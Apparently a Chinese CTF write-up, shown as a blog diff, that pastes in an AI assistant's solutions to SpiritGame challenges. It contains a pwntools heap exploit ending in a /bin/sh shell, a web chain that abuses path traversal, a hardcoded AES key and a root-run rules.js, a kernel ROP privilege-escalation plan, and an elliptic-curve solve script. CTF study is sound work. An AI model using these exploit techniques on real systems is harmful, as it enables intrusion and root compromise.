<span class="subst">&#123;pie:#x&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    add(io, <span class="number">1</span>, REQ_A)</span><br><span class="line">    add(io, <span class="number">2</span>, REQ_BIG)  <span class="comment"># barrier</span></span><br><span class="line">    add(io, <span class="number">3</span>, REQ_B)</span><br><span class="line">    add(io, <span class="number">4</span>, REQ_BIG)  <span class="comment"># guard</span></span><br><span class="line"></span><br><span class="line">    delete(io, <span class="number">1</span>)</span><br><span class="line">    add(io, <span class="number">5</span>, REQ_BIG)  <span class="comment"># put chunk 1 into largebin</span></span><br><span class="line"></span><br><span class="line">    delete(io, <span class="number">3</span>)</span><br><span class="line">    libc.address = u64(show(io, <span class="number">3</span>, REQ_B)[:<span class="number">8</span>]) - UNSORTED_BK_OFF</span><br><span class="line">    log.success(<span class="string">f&quot;libc base = <span class="subst">&#123;libc.address:#x&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    edit(io, <span class="number">1</span>, <span class="string">b&quot;A&quot;</span> * <span class="number">0x18</span> + p64(g_f - <span class="number">0x20</span>))</span><br><span class="line">    log.info(<span class="string">&quot;chunk 1 bk_nextsize -&gt; g_f-0x20&quot;</span>)</span><br><span class="line"></span><br><span class="line">    add(io, <span class="number">6</span>, REQ_BIG)  <span class="comment"># largebin attack: g_f = chunk3_hdr</span></span><br><span class="line">    log.success(<span class="string">&quot;largebin attack done&quot;</span>)</span><br><span class="line"></span><br><span class="line">    system = libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">    binsh = <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>))</span><br><span class="line">    edit(io, <span class="number">3</span>, p64(system) + p64(binsh) + p64(<span class="number">0</span>))</span><br><span class="line">    log.success(<span class="string">&quot;fake callable structure planted in freed chunk 3&quot;</span>)</span><br><span class="line"></span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&quot;gift&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> args.NOAUTO:</span><br><span class="line">        cmd = (args.CMD <span class="keyword">or</span> <span class="string">&quot;cat /flag; exit\nexit&quot;</span>).encode()</span><br><span class="line">        sleep(<span class="number">0.2</span>)</span><br><span class="line">        io.sendline(cmd)</span><br><span class="line">        <span class="built_in">print</span>(io.recvrepeat(<span class="number">2</span>).decode(<span class="string">&quot;latin-1&quot;</span>, <span class="string">&quot;replace&quot;</span>), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        io.close()</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    io = start()</span><br><span class="line">    exploit(io)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="Artifact-Relay-web"><a href="#Artifact-Relay-web" class="headerlink" title="Artifact Relay - web"></a>Artifact Relay - web</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[package.json](package.json) 这是一个ctf web题目的下发文件,题目标题:</span><br><span class="line"># Artifact Relay </span><br><span class="line">&quot;Artifact Relay&quot; 是一个 CI/CD 制品管理平台。用户可以上传制品（tar.gz），平台会自动扫描并生成报告。管理员可以标记制品为&quot;可信&quot;状态，启用自定义扫描规则。</span><br><span class="line"></span><br><span class="line">你能找到 flag 吗？flag 在 /root/flag 文件中，只有 root 用户可以读取。</span><br><span class="line"></span><br><span class="line">地址: https://856wc8v6xeto.challenge.jlu-terminal.site</span><br><span class="line">目标:找到flag</span><br></pre></td></tr></table></figure>
+<p>拿到了。</p>
+<p><strong>Flag</strong><br><code>SpiritGame&#123;r31Ay-RCe_vI4_P4TH-TrAv3Rs4l-symIink_sIGn3r4ca4&#125;</code></p>
+<p><strong>利用链简述</strong></p>
+<ul>
+<li><code>/reports/:artifactId/file</code> 存在<strong>任意绝对路径读取</strong>：<code>/app/server.js:140-179</code></li>
+<li>读取 <code>/app/data/runner_token.enc</code>，再用 <code>/app/lib/crypto.js:3-4,14</code> 里的固定 AES key/IV 解密，得到 runner token：<br><code>Runn3r-S3cr3t-T0k3n-2026</code></li>
+<li><code>/app/entrypoint.sh:28-29</code> + <code>/proc/18/status</code> 证明 <code>internal-runner</code> 是 <strong>root</strong> 跑的</li>
+<li>上传带 <code>.relay/rules.js</code> 的制品，再调用 <code>/internal/runner/trusted-scan</code></li>
+<li><code>internal-runner</code> 在 trusted 模式下会 <code>require(&#39;/work/artifacts/&lt;id&gt;/.relay/rules.js&#39;)</code>：<code>/app/internal-runner.js:111-118</code></li>
+<li>恶意 <code>rules.js</code> 以 root 读取 <code>/root/flag</code>，把 flag 写进 <code>scan.log</code></li>
+<li>最后从 <code>/reports/&lt;id&gt;/file?name=scan.log</code> 读回 flag</li>
+</ul>
+<p><strong>验证结果</strong><br>我实际拿到的 <code>scan.log</code> 里有：<br><code>[1] critical: SpiritGame&#123;r31Ay-RCe_vI4_P4TH-TrAv3Rs4l-symIink_sIGn3r4ca4&#125;</code></p>
+<p>如果你要，我可以把完整 <code>exp</code> 脚本给你整理出来。</p>
+<h2 id="deliverables-misc"><a href="#deliverables-misc" class="headerlink" title="deliverables - misc"></a>deliverables - misc</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://jj42x91e1yqr.challenge.jlu-terminal.site/ 这是一个ctf misc题目,尝试找到flag.</span><br></pre></td></tr></table></figure>
+<p>拿到了。</p>
+<p><strong>Flag</strong><br><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SpiritGame&#123;W0-c@O_H3l-5He-GonG-K1ngl7c2c0d28&#125;</span><br></pre></td></tr></table></figure></p>
+<p><strong>做法简述</strong></p>
+<ul>
+<li>前端 JS 暴露了 <code>/api/guess</code>，返回 <code>distanceMeters</code>。</li>
+<li>这相当于一个<strong>距离预言机</strong>，不需要真看图。</li>
+<li>取 3 个正交探针点：<ul>
+<li><code>(0,0)</code></li>
+<li><code>(0,90)</code></li>
+<li><code>(90,0)</code></li>
+</ul>
+</li>
+<li>设地球半径 <code>R=6371000</code>，则目标点单位向量可直接由：<ul>
+<li><code>x = cos(d1/R)</code></li>
+<li><code>y = cos(d2/R)</code></li>
+<li><code>z = cos(d3/R)</code></li>
+</ul>
+</li>
+<li>再转回经纬度：<ul>
+<li><code>lat = asin(z)</code></li>
+<li><code>lon = atan2(y, x)</code></li>
+</ul>
+</li>
+</ul>
+<p><strong>4 关算出的坐标</strong></p>
+<ul>
+<li><code>30.6353859434, 114.5494052315</code></li>
+<li><code>30.6596937657, 104.0885977344</code></li>
+<li><code>40.1171506666, 124.3877453950</code></li>
+<li><code>31.2056627928, 121.5504343647</code></li>
+</ul>
+<p>提交后 4 关均返回 <code>correct:true</code>，最后 <code>/api/flag</code> 返回上面的 flag。</p>
+<p>如果你要，我可以把自动化解题脚本也发你。</p>
+<p>这个题其实我自己也能做,有一年的cf愚人节出过这种类似的题目,当时就是说能二分做的.</p>
+<h2 id="overflow-pwn"><a href="#overflow-pwn" class="headerlink" title="overflow - pwn"></a>overflow - pwn</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[overflow](overflow/) 这是一个ctf pwn 题目的文件,尝试构造脚本还原flag.我在等拿到靶机,你先分析着</span><br></pre></td></tr></table></figure>
+<p>继续了，已经把骨架落好了。</p>
+<h3 id="目前结论"><a href="#目前结论" class="headerlink" title="目前结论"></a>目前结论</h3><p>这是个 <strong>LKM 栈溢出提权题</strong>：</p>
+<ul>
+<li>设备：<code>/dev/vuln</code></li>
+<li>触发：<code>ioctl(fd, 0xdeadbeef, &amp;req)</code></li>
+<li><code>req</code> 结构：<ul>
+<li><code>size</code>：拷贝长度</li>
+<li><code>ptr</code>：用户态指针</li>
+</ul>
+</li>
+<li>漏洞点：第二次 <code>copy_from_user()</code> 把数据拷进 <strong>16 字节栈 buf</strong></li>
+<li>覆盖返回地址偏移：<strong><code>0x20</code></strong></li>
+</ul>
+<h3 id="保护情况"><a href="#保护情况" class="headerlink" title="保护情况"></a>保护情况</h3><ul>
+<li><code>nokaslr</code>：<strong>关了</strong></li>
+<li><code>smep + smap</code>：<strong>开了</strong></li>
+<li><code>pti=on</code>：<strong>开了</strong></li>
+</ul>
+<p>所以利用路线基本就是：</p>
+<ul>
+<li><code>commit_creds(&amp;init_cred)</code></li>
+<li>再走 <code>swapgs_restore_regs_and_return_to_usermode</code></li>
+<li>回用户态后读 <code>/flag</code></li>
+</ul>
+<h3 id="我已经写好的文件"><a href="#我已经写好的文件" class="headerlink" title="我已经写好的文件"></a>我已经写好的文件</h3><p>在 <code>overflow/</code> 下：</p>
+<ul>
+<li><code>analysis.md</code>：静态分析记录</li>
+<li><code>exp.c</code>：guest 内运行的提权程序</li>
+<li><code>build.ps1</code>：在你当前 Windows + WSL 环境编译 Linux ELF</li>
+<li><code>solve.py</code>：等你拿到 <code>host port</code> 后，自动上传并执行</li>
+<li>另外我已经编译出了：<ul>
+<li><code>overflow/exp</code></li>
+<li><code>overflow/exp.b64</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="我当前采用的返回方案"><a href="#我当前采用的返回方案" class="headerlink" title="我当前采用的返回方案"></a>我当前采用的返回方案</h3><p>我在 <code>exp.c</code> 里先用了 <strong>完整 PTI restore frame</strong>，不是直接硬编码 <code>+22</code>。</p>
+<p>如果靶机 live 的时候在 trampoline 这一步炸了，第一优先 fallback 就是改成常见的：</p>
+<ul>
+<li><code>swapgs_restore_regs_and_return_to_usermode + 22</code></li>
+<li>后面接两个 <code>0</code> 和用户态寄存器现场</li>
+</ul>
+<h3 id="你现在可以直接看"><a href="#你现在可以直接看" class="headerlink" title="你现在可以直接看"></a>你现在可以直接看</h3><ul>
+<li><code>overflow/analysis.md</code></li>
+<li><code>overflow/exp.c</code></li>
+</ul>
+<h3 id="等你拿到靶机后"><a href="#等你拿到靶机后" class="headerlink" title="等你拿到靶机后"></a>等你拿到靶机后</h3><p>直接跑：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="literal">-ExecutionPolicy</span> Bypass <span class="operator">-File</span> overflow/build.ps1</span><br><span class="line">python overflow/solve.py HOST PORT</span><br></pre></td></tr></table></figure>
+<p>你把靶机地址一给我，我就继续帮你把 live 调通。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc challenge.jlu-terminal.site 40216</span><br><span class="line">相关程序: nc位于&quot;D:\SucksFluorine\CTF\MISC\nc\nc.exe&quot;</span><br></pre></td></tr></table></figure>
+<p>打通了，现有 exp 直接成功。</p>
+<h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;sIMp13_R0P-in-LlNUX-KErn3L1a9a12d8&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p>远端执行过程关键输出：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[*] saving user state</span><br><span class="line">[*] building payload</span><br><span class="line">[*] triggering ioctl</span><br><span class="line">[+] returned to userland as root?</span><br><span class="line">flag&#123;sIMp13_R0P-in-LlNUX-KErn3L1a9a12d8&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><ul>
+<li>你当前 <code>overflow/exp.c</code> 这版 <strong>不需要改</strong></li>
+<li><code>swapgs_restore_regs_and_return_to_usermode</code> 的返回方式在这台靶机上 <strong>可用</strong></li>
+<li><code>solve.py</code> 已经能直接自动上传并运行</li>
+</ul>
+<p>如果你要，我下一步可以帮你做两件事之一：</p>
+<ol>
+<li><strong>把 exp 精简成最终提交版</strong></li>
+<li><strong>把完整利用过程整理成 writeup</strong></li>
+</ol>
+<h2 id="Seraphim-Crypto"><a href="#Seraphim-Crypto" class="headerlink" title="Seraphim - Crypto"></a>Seraphim - Crypto</h2><p>Fluu不会这个题,因为Fluu的椭圆曲线很烂.<br>那自然是委托AI大人了…<br>不过据说Crypto在防AI上非常有效,无论是去年的SpiritCTF还是今年的SpiritGame的Crypto都是巨难,作为抵御AI的最后一道防线应该是,总之除了第一个题都是0解,难度过于逆天.  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[dist_seraphim](dist_seraphim/) 这是一个ctf crypto题目,尝试获得flag.</span><br><span class="line">相关程序: nc位于&quot;D:\SucksFluorine\CTF\MISC\nc\nc.exe&quot;</span><br><span class="line">sage:  &quot;D:\Program Files (x86)\SageMath 9.3\runtime\bin\mintty.exe&quot; -t &#x27;SageMath 9.3 Console&#x27; -i sagemath.ico /bin/bash --login -c &#x27;/opt/sagemath-9.3/sage&#x27;</span><br><span class="line">靶机地址: nc challenge.jlu-terminal.site 40401</span><br></pre></td></tr></table></figure>
+<p>拿到了：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SpiritGame&#123;H0ly_Ho1Y-h0LY-1S-Yhwh_0f-hoSTs_THE_Wh0LE-e@RtH_ls_full_of_his_glory0&#125;</span><br></pre></td></tr></table></figure>
+<p>我已写好解题脚本：<code>solve_seraphim.py</code></p>
+<p>运行方式：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\solve_seraphim.py <span class="number">40762</span></span><br></pre></td></tr></table></figure>
+<p>备注：你给的 <code>40401</code> 后续连接会 5 秒无输出关闭；本地已有同题采集脚本指向 <code>40762</code>，该端口可用并成功返回 flag。核心解法是把 genus-2 Jacobian 通过额外 involution 投影到一个 <code>j=1728</code> 的椭圆曲线分量，<code>phi(P)</code> 阶完全光滑，然后 BSGS + CRT 恢复 <code>k</code>。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&quot;challenge.jlu-terminal.site&quot;</span></span><br><span class="line"><span class="comment"># User-supplied port was 40401, but the local seraphim scratch files also</span></span><br><span class="line"><span class="comment"># showed 40762.  Try both unless an explicit port is passed on argv.</span></span><br><span class="line">PORTS = [<span class="number">40401</span>, <span class="number">40762</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Recovered once from the public samples + Mumford divisor constraints.</span></span><br><span class="line">p = <span class="number">7367495255087933276805193837649614002554927076741897426816650643709830951310693163103320102339701723890787146767693768227048509857501029160664569881161907</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># After a fractional linear change of variables the genus-2 curve has an</span></span><br><span class="line"><span class="comment"># extra involution and maps to E1:</span></span><br><span class="line"><span class="comment">#   E1: Y^2 = X^3 + B*X^2 + A*C*X + A^2*D</span></span><br><span class="line">A = <span class="number">3036690328467010575785263209231346143861392768679346285986596692549532320250866862836489155844011819424275791322536618146968760676171223180465688842275410</span></span><br><span class="line">B = <span class="number">2488621222694839294369392921613010109792795125910615887265759312792349386565866962392880544387638164533346082761652564516649860892248218311351886279266450</span></span><br><span class="line">C = <span class="number">743178236629233572616399529499702475448203837856791066537103418155454852443416673038138435198670044037989082434448783450534132211019809287221065372889432</span></span><br><span class="line">D = <span class="number">1099005467296849834034138177305555273452535344295144187027191220212494392050542664835811966909381695895176190249055802112895756078061778381625929386730615</span></span><br><span class="line"></span><br><span class="line">E_A2 = B % p</span><br><span class="line">E_A4 = (A * C) % p</span><br><span class="line">E_A6 = (A * A * D) % p</span><br><span class="line"></span><br><span class="line"><span class="comment"># Involution fixed points for the original x-coordinate.  For a curve point</span></span><br><span class="line"><span class="comment"># (x,y), put:</span></span><br><span class="line"><span class="comment">#   t = (x-alpha)/(x-beta)</span></span><br><span class="line"><span class="comment">#   Y = y*(beta-alpha)^3/(x-beta)^3</span></span><br><span class="line"><span class="comment"># and map to E1 as (A*t^2, A*Y).</span></span><br><span class="line">alpha = <span class="number">6876328904748737725018180915139639735717931938292437598362207267462508887889980285563098762183721608964734670316514183678578609200334293883286931889084452</span></span><br><span class="line">beta = <span class="number">1995363298252981929134739997696770459025292749950930553096176216004745882646646065007149194383669216887088185582917062228158971419739862064346654342814683</span></span><br><span class="line">delta3 = <span class="built_in">pow</span>((beta - alpha) % p, <span class="number">3</span>, p)</span><br><span class="line"></span><br><span class="line"><span class="comment"># phi_1(P) for the printed base divisor P.</span></span><br><span class="line">P1 = (</span><br><span class="line">    <span class="number">2983782718452044527940198744110981610513349390581387927090176505871944530412210264751774185035506864185460611846916854895025821727118158251451085625414191</span>,</span><br><span class="line">    <span class="number">5241092370741603338477435657302402465805042307469574621702392499197357950422188361877087975810425272379640901184791029145876090071066171921891491357011323</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ord(phi_1(P)); all factors are small enough for BSGS.</span></span><br><span class="line">N1 = <span class="number">17460953872793182859901036596444975898038246587789</span></span><br><span class="line">N1_FACTORS = [<span class="number">6524197</span>, <span class="number">21137371</span>, <span class="number">113140037</span>, <span class="number">310584233</span>, <span class="number">1082921449</span>, <span class="number">3327340543</span>]</span><br><span class="line"></span><br><span class="line">O = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inv</span>(<span class="params">a: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(a % p, -<span class="number">1</span>, p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ec_add</span>(<span class="params">P, Q</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Group law on y^2 = x^3 + E_A2*x^2 + E_A4*x + E_A6 over F_p.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> P <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> Q</span><br><span class="line">    <span class="keyword">if</span> Q <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> P</span><br><span class="line">    x1, y1 = P</span><br><span class="line">    x2, y2 = Q</span><br><span class="line">    <span class="keyword">if</span> x1 == x2:</span><br><span class="line">        <span class="keyword">if</span> (y1 + y2) % p == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        lam = ((<span class="number">3</span> * x1 * x1 + <span class="number">2</span> * E_A2 * x1 + E_A4) * inv(<span class="number">2</span> * y1)) % p</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        lam = ((y2 - y1) * inv(x2 - x1)) % p</span><br><span class="line">    x3 = (lam * lam - E_A2 - x1 - x2) % p</span><br><span class="line">    y3 = (lam * (x1 - x3) - y1) % p</span><br><span class="line">    <span class="keyword">return</span> (x3, y3)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ec_neg</span>(<span class="params">P</span>):</span><br><span class="line">    <span class="keyword">if</span> P <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">return</span> (P[<span class="number">0</span>], (-P[<span class="number">1</span>]) % p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ec_mul</span>(<span class="params">k: <span class="built_in">int</span>, P</span>):</span><br><span class="line">    R = <span class="literal">None</span></span><br><span class="line">    Q = P</span><br><span class="line">    <span class="keyword">while</span> k:</span><br><span class="line">        <span class="keyword">if</span> k &amp; <span class="number">1</span>:</span><br><span class="line">            R = ec_add(R, Q)</span><br><span class="line">        Q = ec_add(Q, Q)</span><br><span class="line">        k &gt;&gt;= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> R</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">legendre</span>(<span class="params">a: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">if</span> a % p == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    v = <span class="built_in">pow</span>(a, (p - <span class="number">1</span>) // <span class="number">2</span>, p)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span> <span class="keyword">if</span> v == <span class="number">1</span> <span class="keyword">else</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span 